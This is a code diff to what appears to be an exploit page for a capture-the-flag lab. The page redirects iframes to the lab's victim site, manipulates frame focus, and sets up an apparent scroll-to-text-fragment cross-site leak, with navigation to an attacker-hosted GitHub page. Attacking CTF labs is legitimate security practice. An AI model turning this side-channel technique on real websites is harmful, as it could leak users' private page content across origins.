@@ -40,11 +40,11 @@ window.onload = ()=>{inp.focus();}
 /* using redirect to go to victim site  */
 
 setTimeout( ()=> {
-    frames[0].location=url+ encodeURIComponent(`<html><meta http-equiv="refresh" content="0;https://ctf.s1r1us.ninja/lab/#message">`);
+    frames[0].location=url+ encodeURIComponent(`<html><meta http-equiv="refresh" content="0;https://ctf.s1r1us.ninja/lab/">`);
     //frames[1].location=url+ encodeURIComponent(`<html><meta http-equiv="refresh" content="0;https://ctf.s1r1us.ninja/lab/#message">`);
-    frames[2].location='https://notctf.s1r1us.ninja/index.html?cb='+ encodeURIComponent(`<html><meta http-equiv="refresh" content="0;https://ctf.s1r1us.ninja/lab/#message">`);
-	frames[1].location = "https://ctf.s1r1us.ninja/lab/#message";
-frames[3].location=url+ encodeURIComponent(`<html><meta http-equiv="refresh" content="0;https://ctf.s1r1us.ninja/lab/#message">`);
+    frames[2].location='https://notctf.s1r1us.ninja/index.html?cb='+ encodeURIComponent(`<html><meta http-equiv="refresh" content="0;https://ctf.s1r1us.ninja/lab/">`);
+	frames[1].location = "https://ctf.s1r1us.ninja/lab/";
+frames[3].location=url+ encodeURIComponent(`<html><meta http-equiv="refresh" content="0;https://ctf.s1r1us.ninja/lab/">`);
 	console.log('changing focus');
 },2000);
 
@@ -65,14 +65,15 @@ setTimeout( () => {
         location = 'https://msrkp.github.io/chrome/sttf_iframe.html#inps'
 },4000);
 
-/* changing focus to frames */
+
+/* changing focus to frames 
 setTimeout( () => {
 	frames[0].location = 'https://ctf.s1r1us.ninja/lab/#message'
     frames[1].location = 'https://ctf.s1r1us.ninja/lab/#message'
     frames[2].location = 'https://ctf.s1r1us.ninja/lab/#message'
 frames[3].location = 'https://ctf.s1r1us.ninja/lab/#message'
 },5000);
-
+*/
 
 /*  DO STTF */
 setTimeout(function(){
